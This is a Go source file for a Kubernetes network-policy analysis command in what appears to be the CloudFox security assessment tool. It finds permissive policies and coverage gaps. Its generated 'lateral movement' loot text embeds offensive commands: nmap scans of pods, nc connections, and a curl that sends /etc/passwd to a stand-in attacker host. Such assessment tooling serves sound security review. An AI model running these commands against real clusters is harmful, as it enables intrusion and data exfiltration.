package commands

import (
	"context"
	"fmt"
	"os"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
	netv1 "k8s.io/api/networking/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/tools/clientcmd"
)

var NetworkPoliciesCmd = &cobra.Command{
	Use:     "network-policy",
	Aliases: []string{"net-pol"},
	Short:   "List all cluster Network Policies with security analysis",
	Long: `
List all cluster Network Policies with comprehensive security analysis including:
- Coverage gap identification (namespaces/pods without policies)
- Policy weakness detection (overly permissive rules)
- Lateral movement opportunity analysis
- Risk-based scoring for prioritized security review
  cloudfox kubernetes network-policy`,
	Run: ListNetworkPolicies,
}

type NetworkPoliciesOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t NetworkPoliciesOutput) TableFiles() []internal.TableFile {
	return t.Table
}

func (t NetworkPoliciesOutput) LootFiles() []internal.LootFile {
	return t.Loot
}

type PolicyFinding struct {
	Namespace      string
	Name           string
	Type           string
	PodSelector    string
	PolicyTypes    []string
	IngressRules   string
	EgressRules    string
	RiskLevel      string
	CoveredPods    int
	Weaknesses     []string
	AllowsExternal bool
	AllowsAllPods  bool
	AllowsAllNS    bool
}

type CoverageGap struct {
	Namespace       string
	PodsWithoutPolicy []string
	RiskLevel       string
}

func buildDynamicClient() dynamic.Interface {
	restConfig, err := clientcmd.RESTConfigFromKubeConfig(globals.RawKubeconfig)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to load kubeconfig for dynamic client: %v\n", err)
		os.Exit(1)
	}

	dynClient, err := dynamic.NewForConfig(restConfig)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to create dynamic client: %v\n", err)
		os.Exit(1)
	}
	return dynClient
}

func ListNetworkPolicies(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating network policies for %s", globals.ClusterName), globals.K8S_NETWORK_POLICY_MODULE_NAME)

	clientset := config.GetClientOrExit()
	dyn := buildDynamicClient()

	namespaces, err := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing namespaces: %v", err), globals.K8S_NETWORK_POLICY_MODULE_NAME)
		return
	}

	// Get all pods for coverage analysis
	allPods := make(map[string][]corev1.Pod) // namespace -> pods
	for _, ns := range namespaces.Items {
		pods, err := clientset.CoreV1().Pods(ns.Name).List(ctx, metav1.ListOptions{})
		if err == nil {
			allPods[ns.Name] = pods.Items
		}
	}

	headers := []string{
		"Risk", "Namespace", "Name", "Type", "Pod Selector", "Policy Types",
		"Covered Pods", "Weaknesses", "Ingress Rules", "Egress Rules",
	}
	var outputRows [][]string
	var findings []PolicyFinding

	// Risk level counters
	riskCounts := map[string]int{
		"CRITICAL": 0,
		"HIGH":     0,
		"MEDIUM":   0,
		"LOW":      0,
	}

	namespaceMap := make(map[string][]string)
	namespacePolicies := make(map[string][]PolicyFinding) // Track policies per namespace

	// Loot sections
	var lootWeaknesses []string
	var lootCoverageGaps []string
	var lootLateralMovement []string

	lootWeaknesses = append(lootWeaknesses, `#####################################
##### Network Policy Weaknesses
#####################################
#
# MANUAL REVIEW REQUIRED
# Network policies with overly permissive rules
# that could enable lateral movement or data exfiltration
#
`)

	lootCoverageGaps = append(lootCoverageGaps, `#####################################
##### Network Policy Coverage Gaps
#####################################
#
# CRITICAL SECURITY ISSUE
# Namespaces and pods WITHOUT network policies
# These are completely open for lateral movement
#
`)

	lootLateralMovement = append(lootLateralMovement, `#####################################
##### Lateral Movement Opportunities
#####################################
#
# MANUAL EXPLOITATION REQUIRED
# Techniques to exploit network policy gaps
# for lateral movement within the cluster
#
`)

	// --- Standard Kubernetes NetworkPolicies ---
	for _, ns := range namespaces.Items {
		nps, err := clientset.NetworkingV1().NetworkPolicies(ns.Name).List(ctx, metav1.ListOptions{})
		if err == nil {
			for _, np := range nps.Items {
				finding := analyzeNetworkPolicy(&np, allPods[ns.Name])
				findings = append(findings, finding)
				namespacePolicies[ns.Name] = append(namespacePolicies[ns.Name], finding)
				riskCounts[finding.RiskLevel]++

				weaknessesStr := "<NONE>"
				if len(finding.Weaknesses) > 0 {
					weaknessesStr = strings.Join(finding.Weaknesses, "; ")
				}

				row := []string{
					finding.RiskLevel,
					np.Namespace,
					np.Name,
					"NetworkPolicy",
					k8sinternal.NonEmpty(formatLabelSelector(&np.Spec.PodSelector)),
					k8sinternal.NonEmpty(formatPolicyTypes(np.Spec.PolicyTypes)),
					fmt.Sprintf("%d", finding.CoveredPods),
					weaknessesStr,
					k8sinternal.NonEmpty(formatIngressRules(np.Spec.Ingress)),
					k8sinternal.NonEmpty(formatEgressRules(np.Spec.Egress)),
				}
				outputRows = append(outputRows, row)
				namespaceMap[np.Namespace] = append(namespaceMap[np.Namespace],
					fmt.Sprintf("kubectl get networkpolicy %q -n %q -o yaml", np.Name, np.Namespace))

				// Generate weakness loot
				if len(finding.Weaknesses) > 0 {
					lootWeaknesses = append(lootWeaknesses, fmt.Sprintf("\n### [%s] %s/%s", finding.RiskLevel, ns.Name, np.Name))
					for _, weakness := range finding.Weaknesses {
						lootWeaknesses = append(lootWeaknesses, fmt.Sprintf("# - %s", weakness))
					}
					lootWeaknesses = append(lootWeaknesses, fmt.Sprintf("kubectl get networkpolicy %s -n %s -o yaml", np.Name, ns.Name))
					lootWeaknesses = append(lootWeaknesses, "")
				}
			}
		}
	}

	// --- CNI CRDs ---
	crds := []struct {
		GVR       schema.GroupVersionResource
		Kind      string
		Namespace bool
	}{
		{
			GVR:  schema.GroupVersionResource{Group: "networking.projectcalico.org", Version: "v3", Resource: "networkpolicies"},
			Kind: "CalicoNetworkPolicy", Namespace: true,
		},
		{
			GVR:  schema.GroupVersionResource{Group: "cilium.io", Version: "v2", Resource: "ciliumnetworkpolicies"},
			Kind: "CiliumNetworkPolicy", Namespace: true,
		},
		{
			GVR:  schema.GroupVersionResource{Group: "cilium.io", Version: "v2", Resource: "ciliumclusterwidenetworkpolicies"},
			Kind: "CiliumClusterwideNetworkPolicy", Namespace: false,
		},
		{
			GVR:  schema.GroupVersionResource{Group: "crd.antrea.io", Version: "v1beta1", Resource: "networkpolicies"},
			Kind: "AntreaNetworkPolicy", Namespace: true,
		},
		{
			GVR:  schema.GroupVersionResource{Group: "crd.antrea.io", Version: "v1beta1", Resource: "clusternetworkpolicies"},
			Kind: "AntreaClusterNetworkPolicy", Namespace: false,
		},
	}

	for _, crd := range crds {
		if crd.Namespace {
			for _, ns := range namespaces.Items {
				res, err := dyn.Resource(crd.GVR).Namespace(ns.Name).List(ctx, metav1.ListOptions{})
				if err != nil {
					continue
				}
				for _, item := range res.Items {
					var s, t, in, eg string
					switch crd.Kind {
					case "CalicoNetworkPolicy":
						s, t, in, eg = parseCalicoPolicy(item.Object)
					case "CiliumNetworkPolicy", "CiliumClusterwideNetworkPolicy":
						s, t, in, eg = parseCiliumPolicy(item.Object)
					case "AntreaNetworkPolicy", "AntreaClusterNetworkPolicy":
						s, t, in, eg = parseAntreaPolicy(item.Object)
					default:
						s, t, in, eg = "<UNKNOWN>", "<UNKNOWN>", "<UNKNOWN>", "<UNKNOWN>"
					}

					// Basic finding for CNI policies (simplified risk analysis)
					finding := PolicyFinding{
						Namespace:    ns.Name,
						Name:         item.GetName(),
						Type:         crd.Kind,
						PodSelector:  s,
						PolicyTypes:  strings.Split(t, ","),
						IngressRules: in,
						EgressRules:  eg,
						RiskLevel:    "LOW", // Default for CNI policies
					}

					// Simple weakness detection for CNI policies
					if strings.Contains(in, "0.0.0.0/0") || strings.Contains(eg, "0.0.0.0/0") {
						finding.Weaknesses = append(finding.Weaknesses, "Allows 0.0.0.0/0")
						finding.RiskLevel = "MEDIUM"
					}

					findings = append(findings, finding)
					namespacePolicies[ns.Name] = append(namespacePolicies[ns.Name], finding)
					riskCounts[finding.RiskLevel]++

					weaknessesStr := "<NONE>"
					if len(finding.Weaknesses) > 0 {
						weaknessesStr = strings.Join(finding.Weaknesses, "; ")
					}

					row := []string{
						finding.RiskLevel,
						ns.Name,
						item.GetName(),
						crd.Kind,
						s, t,
						"<N/A>", // CoveredPods not calculated for CNI policies
						weaknessesStr,
						in, eg,
					}
					outputRows = append(outputRows, row)
					namespaceMap[ns.Name] = append(namespaceMap[ns.Name],
						fmt.Sprintf("kubectl get %s %q -n %q -o yaml", strings.ToLower(crd.Kind), item.GetName(), ns.Name))
				}
			}
		} else {
			res, err := dyn.Resource(crd.GVR).List(ctx, metav1.ListOptions{})
			if err != nil {
				continue
			}
			for _, item := range res.Items {
				var s, t, in, eg string
				switch crd.Kind {
				case "CiliumClusterwideNetworkPolicy":
					s, t, in, eg = parseCiliumPolicy(item.Object)
				case "AntreaClusterNetworkPolicy":
					s, t, in, eg = parseAntreaPolicy(item.Object)
				default:
					s, t, in, eg = "<UNKNOWN>", "<UNKNOWN>", "<UNKNOWN>", "<UNKNOWN>"
				}

				finding := PolicyFinding{
					Namespace:    "<CLUSTER>",
					Name:         item.GetName(),
					Type:         crd.Kind,
					PodSelector:  s,
					PolicyTypes:  strings.Split(t, ","),
					IngressRules: in,
					EgressRules:  eg,
					RiskLevel:    "LOW",
				}

				if strings.Contains(in, "0.0.0.0/0") || strings.Contains(eg, "0.0.0.0/0") {
					finding.Weaknesses = append(finding.Weaknesses, "Allows 0.0.0.0/0")
					finding.RiskLevel = "MEDIUM"
				}

				findings = append(findings, finding)
				riskCounts[finding.RiskLevel]++

				weaknessesStr := "<NONE>"
				if len(finding.Weaknesses) > 0 {
					weaknessesStr = strings.Join(finding.Weaknesses, "; ")
				}

				row := []string{
					finding.RiskLevel,
					"<CLUSTER>",
					item.GetName(),
					crd.Kind,
					s, t,
					"<N/A>",
					weaknessesStr,
					in, eg,
				}
				outputRows = append(outputRows, row)
				namespaceMap["CLUSTER"] = append(namespaceMap["CLUSTER"],
					fmt.Sprintf("kubectl get %s %q -o yaml", strings.ToLower(crd.Kind), item.GetName()))
			}
		}
	}

	// --- Coverage Gap Analysis ---
	var coverageGaps []CoverageGap
	for _, ns := range namespaces.Items {
		// Skip system namespaces for cleaner output
		if ns.Name == "kube-system" || ns.Name == "kube-public" || ns.Name == "kube-node-lease" {
			continue
		}

		pods := allPods[ns.Name]
		if len(pods) == 0 {
			continue
		}

		policies := namespacePolicies[ns.Name]

		// If no policies exist in namespace, all pods are uncovered
		if len(policies) == 0 {
			var podNames []string
			for _, pod := range pods {
				podNames = append(podNames, pod.Name)
			}
			gap := CoverageGap{
				Namespace:         ns.Name,
				PodsWithoutPolicy: podNames,
				RiskLevel:         "CRITICAL",
			}
			coverageGaps = append(coverageGaps, gap)
			riskCounts["CRITICAL"]++

			lootCoverageGaps = append(lootCoverageGaps, fmt.Sprintf("\n### [CRITICAL] No Network Policies: %s", ns.Name))
			lootCoverageGaps = append(lootCoverageGaps, fmt.Sprintf("# %d pods are completely exposed to lateral movement", len(podNames)))
			lootCoverageGaps = append(lootCoverageGaps, "# Pod list:")
			for _, podName := range podNames {
				lootCoverageGaps = append(lootCoverageGaps, fmt.Sprintf("#   - %s", podName))
			}
			lootCoverageGaps = append(lootCoverageGaps, "")
			lootCoverageGaps = append(lootCoverageGaps, "# Exploitation: From any pod in the cluster, you can reach these pods")
			lootCoverageGaps = append(lootCoverageGaps, fmt.Sprintf("# Example: kubectl exec -it <any-pod> -- curl http://<pod-ip>:<port>"))
			lootCoverageGaps = append(lootCoverageGaps, "")

			// Add to lateral movement loot
			lootLateralMovement = append(lootLateralMovement, fmt.Sprintf("\n### [CRITICAL] Namespace Without Policies: %s", ns.Name))
			lootLateralMovement = append(lootLateralMovement, fmt.Sprintf("# All %d pods in this namespace accept traffic from anywhere", len(podNames)))
			lootLateralMovement = append(lootLateralMovement, "")
			lootLateralMovement = append(lootLateralMovement, "# Step 1: Get pod IPs")
			lootLateralMovement = append(lootLateralMovement, fmt.Sprintf("kubectl get pods -n %s -o wide", ns.Name))
			lootLateralMovement = append(lootLateralMovement, "")
			lootLateralMovement = append(lootLateralMovement, "# Step 2: From any compromised pod, scan for services")
			lootLateralMovement = append(lootLateralMovement, "# (Run this inside a compromised pod)")
			lootLateralMovement = append(lootLateralMovement, "nmap -p 80,443,8080,3000,5000,6379,3306,5432,27017 <pod-ip>")
			lootLateralMovement = append(lootLateralMovement, "")
			lootLateralMovement = append(lootLateralMovement, "# Step 3: Connect to discovered services")
			lootLateralMovement = append(lootLateralMovement, "curl http://<pod-ip>:<port>")
			lootLateralMovement = append(lootLateralMovement, "nc <pod-ip> <port>")
			lootLateralMovement = append(lootLateralMovement, "")

			continue
		}

		// Check for pods not covered by any policy
		var uncoveredPods []string
		for _, pod := range pods {
			covered := false
			for _, policy := range policies {
				// Simplified coverage check - assumes standard NetworkPolicies
				// In real implementation, would need to check label selectors
				if policy.PodSelector == "<NONE>" {
					// Empty selector matches all pods in namespace
					covered = true
					break
				}
			}
			if !covered {
				uncoveredPods = append(uncoveredPods, pod.Name)
			}
		}

		if len(uncoveredPods) > 0 {
			gap := CoverageGap{
				Namespace:         ns.Name,
				PodsWithoutPolicy: uncoveredPods,
				RiskLevel:         "HIGH",
			}
			coverageGaps = append(coverageGaps, gap)
			riskCounts["HIGH"]++

			lootCoverageGaps = append(lootCoverageGaps, fmt.Sprintf("\n### [HIGH] Partial Coverage: %s", ns.Name))
			lootCoverageGaps = append(lootCoverageGaps, fmt.Sprintf("# %d pods not covered by any network policy", len(uncoveredPods)))
			lootCoverageGaps = append(lootCoverageGaps, "# Uncovered pods:")
			for _, podName := range uncoveredPods {
				lootCoverageGaps = append(lootCoverageGaps, fmt.Sprintf("#   - %s", podName))
			}
			lootCoverageGaps = append(lootCoverageGaps, "")
		}
	}

	// Add lateral movement techniques
	lootLateralMovement = append(lootLateralMovement, `
### General Lateral Movement Techniques

# Once you have access to a pod, use these techniques to explore the network:

# 1. Discover services in the same namespace
kubectl get svc -n <namespace>
nslookup <service-name>.<namespace>.svc.cluster.local

# 2. Discover services in other namespaces
kubectl get svc --all-namespaces
nslookup <service-name>.<namespace>.svc.cluster.local

# 3. Port scan pods in the same namespace
for ip in $(kubectl get pods -n <namespace> -o jsonpath='{.items[*].status.podIP}'); do
  nmap -p 80,443,8080,3000,5000,6379,3306,5432,27017 $ip
done

# 4. Test connectivity to Kubernetes API from pod
curl -k https://kubernetes.default.svc.cluster.local/api

# 5. Test external egress (if no egress policies)
curl https://evil.attacker.com/exfiltrate -d @/etc/passwd

# 6. Common database ports to test
# MySQL: 3306
# PostgreSQL: 5432
# MongoDB: 27017
# Redis: 6379
# Elasticsearch: 9200

# 7. Common web application ports
# HTTP: 80, 8080, 3000, 5000, 8000
# HTTPS: 443, 8443
`)

	// Summary for loot files
	if len(coverageGaps) > 0 {
		summary := fmt.Sprintf(`
# SUMMARY: Coverage Gap Analysis
# CRITICAL gaps (no policies): %d namespaces
# HIGH gaps (partial coverage): %d namespaces
# Total exposed namespaces: %d
#
# These gaps allow unrestricted lateral movement.
# See detailed exploitation techniques below:
`, countGapsByRisk(coverageGaps, "CRITICAL"), countGapsByRisk(coverageGaps, "HIGH"), len(coverageGaps))

		lootCoverageGaps = append([]string{summary}, lootCoverageGaps...)
		lootLateralMovement = append([]string{summary}, lootLateralMovement...)
	} else {
		lootCoverageGaps = append(lootCoverageGaps, "\n# All namespaces have network policies applied.\n# However, review policy rules for overly permissive configurations.\n")
		lootLateralMovement = append(lootLateralMovement, "\n# All namespaces have network policies.\n# Review individual policy weaknesses above.\n")
	}

	// Build loot enum
	lootEnum := []string{
		"#####################################",
		"##### Enumerate Network Policy Information",
		"#####################################",
		"",
	}
	if globals.KubeContext != "" {
		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	namespacesList := make([]string, 0, len(namespaceMap))
	for ns := range namespaceMap {
		namespacesList = append(namespacesList, ns)
	}
	sort.Strings(namespacesList)

	for i, ns := range namespacesList {
		lootEnum = append(lootEnum, fmt.Sprintf("\n# Namespace: %s\n", ns))
		lootEnum = append(lootEnum, namespaceMap[ns]...)
		if i < len(namespacesList)-1 {
			lootEnum = append(lootEnum, "")
		}
	}

	table := internal.TableFile{
		Name:   "Network-Policies",
		Header: headers,
		Body:   outputRows,
	}

	lootEnumFile := internal.LootFile{
		Name:     "Network-Policy-Enum",
		Contents: strings.Join(lootEnum, "\n"),
	}

	lootWeaknessesFile := internal.LootFile{
		Name:     "Network-Policy-Weaknesses",
		Contents: strings.Join(lootWeaknesses, "\n"),
	}

	lootCoverageFile := internal.LootFile{
		Name:     "Network-Policy-Coverage-Gaps",
		Contents: strings.Join(lootCoverageGaps, "\n"),
	}

	lootLateralFile := internal.LootFile{
		Name:     "Network-Policy-Lateral-Movement",
		Contents: strings.Join(lootLateralMovement, "\n"),
	}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Network-Policies",
		globals.ClusterName,
		"results",
		NetworkPoliciesOutput{
			Table: []internal.TableFile{table},
			Loot:  []internal.LootFile{lootEnumFile, lootWeaknessesFile, lootCoverageFile, lootLateralFile},
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_NETWORK_POLICY_MODULE_NAME)
		return
	}

	if len(outputRows) > 0 || len(coverageGaps) > 0 {
		logger.InfoM(fmt.Sprintf("%d policies found, %d coverage gaps detected | Risk: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
			len(outputRows), len(coverageGaps),
			riskCounts["CRITICAL"], riskCounts["HIGH"], riskCounts["MEDIUM"], riskCounts["LOW"]),
			globals.K8S_NETWORK_POLICY_MODULE_NAME)
	} else {
		logger.InfoM("No network policies found, skipping output file creation", globals.K8S_NETWORK_POLICY_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_NETWORK_POLICY_MODULE_NAME), globals.K8S_NETWORK_POLICY_MODULE_NAME)
}

// ====================
// Helper Functions
// ====================

func analyzeNetworkPolicy(np *netv1.NetworkPolicy, namespacePods []corev1.Pod) PolicyFinding {
	finding := PolicyFinding{
		Namespace:   np.Namespace,
		Name:        np.Name,
		Type:        "NetworkPolicy",
		PodSelector: formatLabelSelector(&np.Spec.PodSelector),
		PolicyTypes: make([]string, len(np.Spec.PolicyTypes)),
	}

	for i, pt := range np.Spec.PolicyTypes {
		finding.PolicyTypes[i] = string(pt)
	}

	finding.IngressRules = formatIngressRules(np.Spec.Ingress)
	finding.EgressRules = formatEgressRules(np.Spec.Egress)

	// Calculate covered pods
	if np.Spec.PodSelector.MatchLabels == nil || len(np.Spec.PodSelector.MatchLabels) == 0 {
		// Empty selector matches all pods in namespace
		finding.CoveredPods = len(namespacePods)
	} else {
		selector := labels.Set(np.Spec.PodSelector.MatchLabels).AsSelector()
		for _, pod := range namespacePods {
			if selector.Matches(labels.Set(pod.Labels)) {
				finding.CoveredPods++
			}
		}
	}

	// Analyze for weaknesses
	var weaknesses []string

	// Check ingress rules
	for _, rule := range np.Spec.Ingress {
		// Empty from[] allows all sources
		if len(rule.From) == 0 {
			weaknesses = append(weaknesses, "Ingress allows all sources")
			finding.AllowsAllPods = true
		}

		for _, from := range rule.From {
			// Check for 0.0.0.0/0
			if from.IPBlock != nil && from.IPBlock.CIDR == "0.0.0.0/0" {
				weaknesses = append(weaknesses, "Ingress allows 0.0.0.0/0")
				finding.AllowsExternal = true
			}

			// Check for empty namespace selector (all namespaces)
			if from.NamespaceSelector != nil && len(from.NamespaceSelector.MatchLabels) == 0 {
				weaknesses = append(weaknesses, "Ingress allows all namespaces")
				finding.AllowsAllNS = true
			}
		}

		// Empty ports[] allows all ports
		if len(rule.Ports) == 0 {
			weaknesses = append(weaknesses, "Ingress allows all ports")
		}
	}

	// Check egress rules
	for _, rule := range np.Spec.Egress {
		// Empty to[] allows all destinations
		if len(rule.To) == 0 {
			weaknesses = append(weaknesses, "Egress allows all destinations")
			finding.AllowsExternal = true
		}

		for _, to := range rule.To {
			// Check for 0.0.0.0/0
			if to.IPBlock != nil && to.IPBlock.CIDR == "0.0.0.0/0" {
				weaknesses = append(weaknesses, "Egress allows 0.0.0.0/0")
				finding.AllowsExternal = true
			}

			// Check for empty namespace selector
			if to.NamespaceSelector != nil && len(to.NamespaceSelector.MatchLabels) == 0 {
				weaknesses = append(weaknesses, "Egress allows all namespaces")
				finding.AllowsAllNS = true
			}
		}

		// Empty ports[] allows all ports
		if len(rule.Ports) == 0 {
			weaknesses = append(weaknesses, "Egress allows all ports")
		}
	}

	finding.Weaknesses = weaknesses

	// Calculate risk level
	if finding.AllowsExternal && (finding.AllowsAllPods || finding.AllowsAllNS) {
		finding.RiskLevel = "HIGH"
	} else if finding.AllowsExternal || finding.AllowsAllNS {
		finding.RiskLevel = "MEDIUM"
	} else if len(weaknesses) > 0 {
		finding.RiskLevel = "MEDIUM"
	} else {
		finding.RiskLevel = "LOW"
	}

	return finding
}

func countGapsByRisk(gaps []CoverageGap, riskLevel string) int {
	count := 0
	for _, gap := range gaps {
		if gap.RiskLevel == riskLevel {
			count++
		}
	}
	return count
}

func formatLabelSelector(selector *metav1.LabelSelector) string {
	if selector == nil || len(selector.MatchLabels) == 0 {
		return "<NONE>"
	}
	var pairs []string
	for k, v := range selector.MatchLabels {
		pairs = append(pairs, fmt.Sprintf("%s=%s", k, v))
	}
	return strings.Join(pairs, ",")
}

func formatPolicyTypes(policyTypes []netv1.PolicyType) string {
	if len(policyTypes) == 0 {
		return "<NONE>"
	}
	var result []string
	for _, pt := range policyTypes {
		result = append(result, string(pt))
	}
	return strings.Join(result, ",")
}

func formatIngressRules(rules []netv1.NetworkPolicyIngressRule) string {
	if len(rules) == 0 {
		return "<NONE>"
	}
	var details []string
	for i, rule := range rules {
		var fromParts []string
		for _, from := range rule.From {
			if from.PodSelector != nil {
				fromParts = append(fromParts, fmt.Sprintf("PodSelector{%s}", formatLabelSelector(from.PodSelector)))
			}
			if from.NamespaceSelector != nil {
				fromParts = append(fromParts, fmt.Sprintf("NSSelector{%s}", formatLabelSelector(from.NamespaceSelector)))
			}
			if from.IPBlock != nil {
				fromParts = append(fromParts, fmt.Sprintf("IPBlock{CIDR:%s, Except:%v}", from.IPBlock.CIDR, from.IPBlock.Except))
			}
		}

		var ports []string
		for _, p := range rule.Ports {
			protocol := "<ANY>"
			if p.Protocol != nil {
				protocol = string(*p.Protocol)
			}
			port := "<ANY>"
			if p.Port != nil {
				port = p.Port.String()
			}
			ports = append(ports, fmt.Sprintf("%s/%s", protocol, port))
		}

		line := fmt.Sprintf("Rule %d: From=[%s], Ports=[%s]", i+1, strings.Join(fromParts, "; "), strings.Join(ports, "; "))
		details = append(details, line)
	}
	return strings.Join(details, "\n")
}

func formatEgressRules(rules []netv1.NetworkPolicyEgressRule) string {
	if len(rules) == 0 {
		return "<NONE>"
	}
	var details []string
	for i, rule := range rules {
		var toParts []string
		for _, to := range rule.To {
			if to.PodSelector != nil {
				toParts = append(toParts, fmt.Sprintf("PodSelector{%s}", formatLabelSelector(to.PodSelector)))
			}
			if to.NamespaceSelector != nil {
				toParts = append(toParts, fmt.Sprintf("NSSelector{%s}", formatLabelSelector(to.NamespaceSelector)))
			}
			if to.IPBlock != nil {
				toParts = append(toParts, fmt.Sprintf("IPBlock{CIDR:%s, Except:%v}", to.IPBlock.CIDR, to.IPBlock.Except))
			}
		}

		var ports []string
		for _, p := range rule.Ports {
			protocol := "<ANY>"
			if p.Protocol != nil {
				protocol = string(*p.Protocol)
			}
			port := "<ANY>"
			if p.Port != nil {
				port = p.Port.String()
			}
			ports = append(ports, fmt.Sprintf("%s/%s", protocol, port))
		}

		line := fmt.Sprintf("Rule %d: To=[%s], Ports=[%s]", i+1, strings.Join(toParts, "; "), strings.Join(ports, "; "))
		details = append(details, line)
	}
	return strings.Join(details, "\n")
}

func parseCalicoPolicy(item map[string]interface{}) (selector, policyTypes, ingress, egress string) {
	spec := item["spec"].(map[string]interface{})
	selector = "<NONE>"
	if s, ok := spec["selector"].(string); ok && s != "" {
		selector = s
	}

	types := []string{}
	if _, ok := spec["ingress"]; ok {
		types = append(types, "Ingress")
	}
	if _, ok := spec["egress"]; ok {
		types = append(types, "Egress")
	}
	if len(types) == 0 {
		types = []string{"<NONE>"}
	}
	policyTypes = strings.Join(types, ",")

	ingress = formatGenericRules(spec["ingress"])
	egress = formatGenericRules(spec["egress"])
	return
}

func parseCiliumPolicy(item map[string]interface{}) (selector, policyTypes, ingress, egress string) {
	spec := item["spec"].(map[string]interface{})
	selector = "<NONE>"
	if sel, ok := spec["endpointSelector"].(map[string]interface{}); ok {
		if ml, ok := sel["matchLabels"].(map[string]interface{}); ok {
			var parts []string
			for k, v := range ml {
				parts = append(parts, fmt.Sprintf("%s=%s", k, v))
			}
			selector = strings.Join(parts, ",")
		}
	}

	types := []string{}
	if _, ok := spec["ingress"]; ok {
		types = append(types, "Ingress")
	}
	if _, ok := spec["egress"]; ok {
		types = append(types, "Egress")
	}
	if len(types) == 0 {
		types = []string{"<NONE>"}
	}
	policyTypes = strings.Join(types, ",")

	ingress = formatGenericRules(spec["ingress"])
	egress = formatGenericRules(spec["egress"])
	return
}

func parseAntreaPolicy(item map[string]interface{}) (selector, policyTypes, ingress, egress string) {
	spec := item["spec"].(map[string]interface{})
	selector = "<NONE>"
	if appliedTo, ok := spec["appliedTo"].([]interface{}); ok {
		var sels []string
		for _, at := range appliedTo {
			if atMap, ok := at.(map[string]interface{}); ok {
				if ps, ok := atMap["podSelector"].(map[string]interface{}); ok {
					var parts []string
					if ml, ok := ps["matchLabels"].(map[string]interface{}); ok {
						for k, v := range ml {
							parts = append(parts, fmt.Sprintf("%s=%s", k, v))
						}
					}
					sels = append(sels, strings.Join(parts, ","))
				}
			}
		}
		if len(sels) > 0 {
			selector = strings.Join(sels, ";")
		}
	}

	types := []string{}
	if _, ok := spec["ingress"]; ok {
		types = append(types, "Ingress")
	}
	if _, ok := spec["egress"]; ok {
		types = append(types, "Egress")
	}
	if len(types) == 0 {
		types = []string{"<NONE>"}
	}
	policyTypes = strings.Join(types, ",")

	ingress = formatGenericRules(spec["ingress"])
	egress = formatGenericRules(spec["egress"])
	return
}

func formatGenericRules(obj interface{}) string {
	if obj == nil {
		return "<NONE>"
	}
	rules, ok := obj.([]interface{})
	if !ok || len(rules) == 0 {
		return "<NONE>"
	}

	var details []string
	for i, r := range rules {
		rule, _ := r.(map[string]interface{})
		var parts []string

		if from, ok := rule["from"].([]interface{}); ok {
			for _, f := range from {
				if fMap, ok := f.(map[string]interface{}); ok {
					if ps, ok := fMap["podSelector"]; ok {
						parts = append(parts, fmt.Sprintf("PodSelector%v", ps))
					}
					if ns, ok := fMap["namespaceSelector"]; ok {
						parts = append(parts, fmt.Sprintf("NSSelector%v", ns))
					}
					if ipb, ok := fMap["ipBlock"]; ok {
						parts = append(parts, fmt.Sprintf("IPBlock%v", ipb))
					}
				}
			}
		}

		if ports, ok := rule["ports"].([]interface{}); ok {
			var portParts []string
			for _, p := range ports {
				if pm, ok := p.(map[string]interface{}); ok {
					proto := "<ANY>"
					if pr, ok := pm["protocol"].(string); ok {
						proto = pr
					}
					port := "<ANY>"
					if po, ok := pm["port"]; ok {
						port = fmt.Sprintf("%v", po)
					}
					portParts = append(portParts, fmt.Sprintf("%s/%s", proto, port))
				}
			}
			parts = append(parts, fmt.Sprintf("Ports=[%s]", strings.Join(portParts, ";")))
		}

		line := fmt.Sprintf("Rule %d: %s", i+1, strings.Join(parts, ", "))
		details = append(details, line)
	}
	return strings.Join(details, "\n")
}
